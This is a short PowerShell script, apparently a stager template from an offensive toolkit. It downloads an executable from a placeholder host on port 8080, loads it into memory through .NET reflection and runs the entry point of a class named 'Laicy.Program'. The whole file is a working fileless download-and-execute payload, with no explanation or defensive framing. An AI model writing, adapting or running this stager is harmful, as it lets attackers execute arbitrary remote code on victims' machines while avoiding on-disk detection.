function Load-Assembly {
	$download = (New-Object System.Net.WebClient).DownloadData('http://!!!IP_MARK!!!:8080/assembly.exe');
	$asm = [System.Reflection.Assembly]::Load($download);
	$class = $asm.GetType('Laicy.Program');
	$method = $class.GetMethod('Main');
	$method.Invoke(0, $null)
	#[Laicy.Program]::Main(@("args"))
	#[Laicy.Program]::Main("args".Split())
}
Load-Assembly